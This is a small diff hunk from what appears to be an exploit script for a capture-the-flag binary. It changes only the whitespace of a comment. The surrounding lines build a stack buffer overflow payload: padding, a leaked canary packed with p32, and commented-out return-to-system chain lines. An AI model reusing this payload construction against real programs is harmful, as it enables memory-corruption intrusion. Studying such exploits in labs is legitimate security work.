@@ -88,7 +88,7 @@ payload = 'A' * 512
 payload += p32(canary)
 payload += 'B' * 12
 
-#--------------------------											    # Approach 2, comment the below payload and uncommented the last seconde line
+#--------------------------					      # Approach 2, comment the below payload and uncommented the last seconde line
 # payload += p32(process_hash) + p32(call_system) + p32(g_buf_bss)		
 # payload = b64e(payload)
 #
